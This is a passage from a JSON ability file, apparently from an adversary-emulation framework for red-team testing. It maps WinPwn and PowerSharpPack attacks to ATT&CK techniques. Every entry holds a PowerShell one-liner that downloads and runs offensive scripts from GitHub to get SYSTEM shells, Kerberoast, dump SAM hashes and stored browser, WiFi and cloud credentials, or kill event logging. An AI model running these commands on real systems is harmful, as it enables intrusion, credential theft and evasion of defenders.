"edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); otherchecks -noninteractive -consoleoutput", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Information Discovery", "ability_id": "c58ba91431b9d73d726ccdd7d030a694", "technique_id": "T1082", "tactic": "discovery", "requirements": [], "name": "WinPwn - General privesc checks", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Collect general computer informations via GeneralRecon function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); Generalrecon -consoleoutput -noninteractive", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Information Discovery", "ability_id": "b7e7e9eb804006a78cdd75940f7b7c3e", "technique_id": "T1082", "tactic": "discovery", "requirements": [], "name": "WinPwn - GeneralRecon", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Get SYSTEM shell - Bind System Shell using CreateProcess technique via function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Native API", "ability_id": "2ca71106ee0aff2eda551bb6ed2b39e4", "technique_id": "T1106", "tactic": "execution", "requirements": [], "name": "WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique via function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Process Injection: Dynamic-link Library Injection", "ability_id": "c1392878b0e39a2060e7e1b70e5a580b", "technique_id": "T1055.001", "tactic": "multiple", "requirements": [], "name": "WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Get SYSTEM shell - Pop System Shell using CreateProcess technique via function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Native API", "ability_id": "b262964145fa55e27265e7caa89b1169", "technique_id": "T1106", "tactic": "execution", "requirements": [], "name": "WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique via function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Native API", "ability_id": "f6d9c3fbee5549837ea37ff933291656", "technique_id": "T1106", "tactic": "execution", "requirements": [], "name": "WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Get SYSTEM shell - Pop System Shell using Token Manipulation technique via function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Create Process with Token", "ability_id": "fdc26580786ac9d3ffc38aea053cbd29", "technique_id": "T1134.002", "tactic": "multiple", "requirements": [], "name": "WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Kerberoasting technique via function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); Kerberoasting -consoleoutput -noninteractive", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting", "ability_id": "efdca41c8a098f89f2db9c334627d8ac", "technique_id": "T1558.003", "tactic": "credential-access", "requirements": [], "name": "WinPwn - Kerberoasting", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Kill the event log services for stealth via function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); inv-phantom -consoleoutput -noninteractive", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "d5bb3cda05ddba230c90c1afb2640379", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "WinPwn - Kill the event log services for stealth", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials technique via function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); SharpCloud -consoleoutput -noninteractive", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Credentials In Files", "ability_id": "ac7757ba58f423fa808b4b6f115cc613", "technique_id": "T1552.001", "tactic": "credential-access", "requirements": [], "name": "WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Loot local Credentials - Decrypt Teamviewer Passwords technique via function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); decryptteamviewer -consoleoutput -noninteractive", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Credentials from Password Stores", "ability_id": "f6867f2b9b1b3c2eb733ad7ce7438f04", "technique_id": "T1555", "tactic": "credential-access", "requirements": [], "name": "WinPwn - Loot local Credentials - Decrypt Teamviewer Passwords", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Loot local Credentials - Dump SAM-File for NTLM Hashes technique via function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); samfile -consoleoutput -noninteractive", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: Security Account Manager", "ability_id": "1ae855684c48448c29ad04858bbe5a2a", "technique_id": "T1003.002", "tactic": "credential-access", "requirements": [], "name": "WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Loot local Credentials - Invoke-WCMDump technique via function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1'); Invoke-WCMDump", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Credentials from Password Stores: Windows Credential Manager", "ability_id": "1353d954c020fa5ff039b7e85ee261bc", "technique_id": "T1555.004", "tactic": "credential-access", "requirements": [], "name": "WinPwn - Loot local Credentials - Invoke-WCMDump", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Loot local Credentials - Safetykatz technique via function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); safedump -consoleoutput -noninteractive", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Valid Accounts: Local Accounts", "ability_id": "fe3527480a77ab0b52a518654e120b72", "technique_id": "T1078.003", "tactic": "multiple", "requirements": [], "name": "WinPwn - Loot local Credentials - Safetykatz", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Loot local Credentials - Wifi Credentials technique via function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); wificreds -consoleoutput -noninteractive", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Credentials from Password Stores", "ability_id": "c7aa16aea441e7bec9a6391af601acc9", "technique_id": "T1555", "tactic": "credential-access", "requirements": [], "name": "WinPwn - Loot local Credentials - Wifi Credentials", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The [LaZagne project](https://github.com/AlessandroZ/LaZagne) is an open source application used to retrieve lots of passwords stored on a local computer. \nEach software stores its passwords using different techniques (plaintext, APIs, custom algorithms, databases, etc.). \nThis tool has been developed for the purpose of finding these passwords for the most commonly-used software", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); lazagnemodule -consoleoutput -noninteractive", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Credentials from Password Stores", "ability_id": "2c6e39a39ebf794d74417a7b1291463b", "technique_id": "T1555", "tactic": "credential-access", "requirements": [], "name": "WinPwn - Loot local Credentials - lazagne", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Loot local Credentials - mimi-kittenz technique via function of WinPwn - Extend timeout to 600s", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); kittenz -consoleoutput -noninteractive", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Credentials from Password Stores: Credentials from Web Browsers", "ability_id": "c6ea575d9641c11410417105f14175ab", "technique_id": "T1555.003", "tactic": "credential-access", "requirements": [], "name": "WinPwn - Loot local Credentials - mimi-kittenz", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Loot local Credentials - powerhell kittie technique via function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); obfuskittiedump -consoleoutput -noninteractive", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Valid Accounts: Local Accounts", "ability_id": "5ce7136a4547b0bf3ca074c94fb10b24", "technique_id": "T1078.003", "tactic": "multiple", "requirements": [], "name": "WinPwn - Loot local Credentials - powerhell kittie", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Search for MS17-10 vulnerable Windows Servers in the domain using powerSQL function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); MS17-10 -noninteractive -consoleoutput", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Network Service Discovery", "ability_id": "e958169f1efe85a5a5ea7a77eba8c29e", "technique_id": "T1046", "tactic": "discovery", "requirements": [], "name": "WinPwn - MS17-10", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Gathers local system information using the Morerecon function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); Morerecon -noninteractive -consoleoutput", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Information Discovery", "ability_id": "a9faa0d792d6bc2660b05e7650d2736d", "technique_id": "T1082", "tactic": "discovery", "requirements": [], "name": "WinPwn - Morerecon", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1'); Invoke-Rubeus -Command \"asreproast /format:hashcat /nowrap\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Steal or Forge Kerberos Tickets: AS-REP Roasting", "ability_id": "52928f462ea8f5fa617aa8c815f5598b", "technique_id": "T1558.004", "tactic": "credential-access", "requirements": [], "name": "WinPwn - PowerSharpPack - Kerberoasting Using Rubeus", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1'); Invoke-Rubeus -Command \"kerberoast /format:hashcat /nowrap\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting", "ability_id": "5e3512c73a461c17ddcb1cc0bbdbeef9", "technique_id": "T1558.003", "tactic": "credential-access", "requirements": [], "name": "WinPwn - PowerSharpPack - Kerberoasting Using Rubeus", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS technique via function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1'); Invoke-Internalmonologue -command \"-Downgrade true -impersonate true -restore true\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Forced Authentication", "ability_id": "6b8a391237b7169d02dd6538f8290345", "technique_id": "T1187", "tactic": "credential-access", "requirements": [], "name": "WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "PowerSharpPack - Seatbelt technique via function of WinPwn.\n\n[Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# project that performs a number of security oriented host-survey \"safety checks\" relevant from both offensive and defensive security perspectives.", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1'); Invoke-Seatbelt -Command \"-group=all\"; pause", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Information Discovery", "ability_id": "b8e136dad1af7b29939e86be6d7ecefa", "technique_id": "T1082", "tactic": "discovery", "requirements": [], "name": "WinPwn - PowerSharpPack - Seatbelt", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "PowerSharpPack - Sharpup checking common Privesc vectors technique via function of WinPwn - Takes several minutes to complete.", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1'); Invoke-SharpUp -command \"audit\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Information Discovery", "ability_id": "413fc5fa7ac34f8a42183217d7f3ec90", "technique_id": "T1082", "tactic": "discovery", "requirements": [], "name": "WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "PowerSharpPack - Sharpweb searching for Browser Credentials technique via function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1'); Invoke-Sharpweb -command \"all\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Credentials from Password Stores: Credentials from Web Browsers", "ability_id": "aee64e494f7adfb1867d67f7ee08e5c6", "technique_id": "T1555.003", "tactic": "credential-access", "requirements": [], "name": "WinPwn - PowerSharpPack - Sharpweb for Browser Credentials", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "PowerSharpPack - Watson searching for missing windows patches  technique via function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1'); Invoke-watson", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Information Discovery", "ability_id": "286916316d725933021d57fb5620d644", "technique_id": "T1082", "tactic": "discovery", "requirements": [], "name": "WinPwn - PowerSharpPack - Watson searching for missing windows patches", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Powersploits privesc checks using oldchecks function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["rm -force -recurse .\\DomainRecon -ErrorAction Ignore; rm -force -recurse .\\Exploitation -ErrorAction Ignore; rm -force -recurse .\\LocalPrivEsc -ErrorAction Ignore; rm -force -recurse .\\LocalRecon -ErrorAction Ignore; rm -force -recurse .\\Vulnerabilities -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); oldchecks -noninteractive -consoleoutput", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Information Discovery", "ability_id": "009e7a7118b5a182b2a5b65150e5cc6f", "technique_id": "T1082", "tactic": "discovery", "requirements": [], "name": "WinPwn - Powersploits privesc checks", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Search for Resource-Based Constrained Delegation attack paths using RBCD-Check function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); RBCD-Check -consoleoutput -noninteractive", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Information Discovery", "ability_id": 